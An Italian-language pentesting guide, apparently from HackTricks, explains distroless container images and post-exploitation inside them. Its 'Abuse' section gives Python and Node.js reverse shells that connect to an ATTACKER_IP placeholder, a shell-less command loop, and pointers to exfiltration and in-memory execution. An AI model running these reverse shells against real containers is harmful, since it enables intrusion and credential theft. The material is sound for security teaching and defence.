# Container Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un'immagine di container **distroless** è un'immagine che include i **componenti runtime minimi necessari per eseguire una specifica applicazione**, rimuovendo intenzionalmente i consueti strumenti della distribuzione, come package manager, shell e grandi insiemi di utility userland generiche. In pratica, le immagini distroless contengono spesso solo il binario o il runtime dell'applicazione, le librerie condivise, i certificati e una struttura filesystem molto ridotta.

Il punto non è che distroless sia una nuova primitiva di isolamento del kernel. Distroless è una **strategia di progettazione delle immagini**. Modifica ciò che è disponibile **all'interno** del filesystem del container, non il modo in cui il kernel isola il container. Questa distinzione è importante, perché distroless hardening l'ambiente principalmente riducendo ciò che un attacker può utilizzare dopo aver ottenuto code execution. Non sostituisce namespaces, seccomp, capabilities, AppArmor, SELinux o qualsiasi altro meccanismo di runtime isolation.

## Perché Esiste Distroless

Le immagini distroless vengono utilizzate principalmente per ridurre:

- la dimensione dell'immagine
- la complessità operativa dell'immagine
- il numero di pacchetti e binari che potrebbero contenere vulnerabilities
- il numero di strumenti di post-exploitation disponibili di default per un attacker

Per questo le immagini distroless sono popolari nei deployment di applicazioni in produzione. Un container che non contiene shell, package manager e quasi nessuno strumento generico è generalmente più facile da gestire operativamente e più difficile da abusare interattivamente dopo una compromissione.

Esempi di famiglie di immagini distroless note includono:

- le immagini distroless di Google
- le immagini hardened/minimal di Chainguard

## Cosa Non Significa Distroless

Un container distroless **non è**:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protetto da seccomp, AppArmor o SELinux
- automaticamente al sicuro da container escape

È comunque possibile eseguire un'immagine distroless con `--privileged`, host namespace sharing, bind mount pericolosi o un runtime socket montato. In questo scenario, l'immagine può essere minimal, ma il container può comunque essere catastroficamente insicuro. Distroless modifica la **userland attack surface**, non il **kernel trust boundary**.

## Caratteristiche Operative Tipiche

Quando comprometti un container distroless, la prima cosa che di solito noti è che le supposizioni comuni smettono di essere valide. Potrebbero non esserci `sh`, `bash`, `ls`, `id`, `cat` e talvolta nemmeno un ambiente basato su libc che si comporti come previsto dal tuo consueto tradecraft. Questo influisce sia sull'offense sia sulla defense, perché la mancanza di strumenti rende debugging, incident response e post-exploitation diversi.

I pattern più comuni sono:

- esiste il runtime dell'applicazione, ma poco altro
- i payload basati su shell falliscono perché non c'è una shell
- i comuni one-liner di enumeration falliscono perché mancano i binari di supporto
- spesso sono presenti anche filesystem protections come un rootfs read-only o `noexec` sulle posizioni tmpfs writable

È questa combinazione che porta solitamente a parlare di "weaponizing distroless".

## Distroless E Post-Exploitation

La principale sfida offensiva in un ambiente distroless non è sempre l'RCE iniziale. Spesso è ciò che viene dopo. Se il workload compromesso consente code execution in un language runtime come Python, Node.js, Java o Go, potresti essere in grado di eseguire logica arbitraria, ma non attraverso i normali workflow shell-centric comuni in altri target Linux.

Questo significa che la post-exploitation spesso si sposta in una di queste tre direzioni:

1. **Utilizzare direttamente il language runtime già disponibile** per enumerare l'ambiente, aprire socket, leggere file o effettuare lo staging di payload aggiuntivi.
2. **Portare i propri strumenti in memoria** se il filesystem è read-only o le posizioni writable sono montate `noexec`.
3. **Abusare dei binari già presenti nell'immagine** se l'applicazione o le sue dependencies includono qualcosa di inaspettatamente utile.

## Abuse

### Enumerare Il Runtime Già Disponibile

In molti container distroless non c'è una shell, ma esiste comunque un application runtime. Se il target è un servizio Python, Python è presente. Se il target è Node.js, Node è presente. Questo spesso offre funzionalità sufficienti per enumerare i file, leggere le environment variables, aprire reverse shells ed effettuare l'in-memory execution senza invocare mai `/bin/sh`.

Un semplice esempio con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un semplice esempio con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impatto:

- recupero delle variabili d'ambiente, spesso incluse le credenziali o gli endpoint dei servizi
- enumerazione del filesystem senza `/bin/ls`
- identificazione dei percorsi scrivibili e dei secret montati

### Reverse Shell senza `/bin/sh`

Se l'immagine non contiene `sh` o `bash`, una Reverse Shell basata su una shell classica potrebbe fallire immediatamente. In questo caso, usa invece il language runtime installato.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` non esiste, sostituisci la riga finale con l'esecuzione diretta dei comandi tramite Python o con un loop REPL di Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ancora una volta, se `/bin/sh` è assente, usa direttamente le API di filesystem, process e networking di Node invece di avviare una shell.

### Esempio completo: ciclo di comandi Python senza shell

Se l'immagine contiene Python ma non dispone affatto di una shell, spesso un semplice loop interattivo è sufficiente per mantenere tutte le funzionalità di post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Questo non richiede un binary di interactive shell. L'impatto è di fatto lo stesso di una shell di base dal punto di vista dell'attaccante: command execution, enumeration e staging di ulteriori payload tramite il runtime esistente.

### Esecuzione di Tool in Memoria

Le immagini Distroless sono spesso combinate con:

- `readOnlyRootFilesystem: true`
- tmpfs scrivibile ma `noexec`, come `/dev/shm`
- assenza di tool per la gestione dei package

Questa combinazione rende inaffidabili i workflow classici del tipo "download binary to disk and run it". In questi casi, le tecniche di memory execution diventano la soluzione principale.

La pagina dedicata è:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Le tecniche più rilevanti sono:

- `memfd_create` + `execve` tramite scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binary Esistenti Già Presenti Nell'Immagine

Alcune immagini Distroless contengono ancora binary necessari per le operazioni, che diventano utili dopo una compromise. Un esempio osservato ripetutamente è `openssl`, perché le applicazioni a volte ne hanno bisogno per attività relative alla crittografia o a TLS.

Un pattern di ricerca rapido è:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` è presente, può essere utilizzabile per:

- connessioni TLS in uscita
- esfiltrazione di dati tramite un canale di egress consentito
- staging dei dati del payload tramite blob codificati/crittografati

L'abuso esatto dipende da ciò che è effettivamente installato, ma l'idea generale è che distroless non significhi "nessuno strumento"; significa "molti meno strumenti rispetto a una normale image di distribuzione".

## Controlli

L'obiettivo di questi controlli è determinare se l'image è realmente distroless in pratica e quali runtime o helper binaries siano ancora disponibili per il post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Cosa c'è di interessante:

- Se non esiste alcuna shell, ma è presente un runtime come Python o Node, il post-exploitation dovrebbe passare all'esecuzione basata sul runtime.
- Se il filesystem root è in sola lettura e `/dev/shm` è scrivibile ma impostato con `noexec`, le tecniche di esecuzione in memoria diventano molto più rilevanti.
- Se sono presenti helper binaries come `openssl`, `busybox` o `java`, potrebbero offrire funzionalità sufficienti per bootstrapparsi verso un accesso ulteriore.

## Default del runtime

| Stile di immagine / piattaforma | Stato predefinito | Comportamento tipico | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Immagini in stile Google distroless | Userland minimale per progettazione | Nessuna shell, nessun package manager, solo dipendenze dell'applicazione/runtime | aggiunta di layer di debugging, sidecar shell, copia di busybox o altri strumenti |
| Immagini minimali Chainguard | Userland minimale per progettazione | Superficie dei package ridotta, spesso focalizzata su un solo runtime o servizio | uso di varianti `:latest-dev` o di debug, copia di strumenti durante la build |
| Workload Kubernetes che utilizzano immagini distroless | Dipende dalla configurazione del Pod | Distroless influenza solo il userland; il security posture del Pod dipende ancora dal Pod spec e dai default del runtime | aggiunta di container di debug effimeri, mount dell'host, impostazioni di Pod privilegiati |
| Docker / Podman che eseguono immagini distroless | Dipende dai run flags | Filesystem minimale, ma la sicurezza del runtime dipende ancora dai flag e dalla configurazione del daemon | `--privileged`, condivisione dei namespace dell'host, mount dei socket del runtime, bind mount scrivibili dell'host |

Il punto chiave è che distroless è una **proprietà dell'immagine**, non una protezione del runtime. Il suo valore deriva dalla riduzione di ciò che è disponibile all'interno del filesystem dopo una compromissione.

## Pagine correlate

Per i bypass del filesystem e dell'esecuzione in memoria comunemente necessari negli ambienti distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Per gli abusi del container runtime, dei socket e dei mount ancora applicabili ai workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
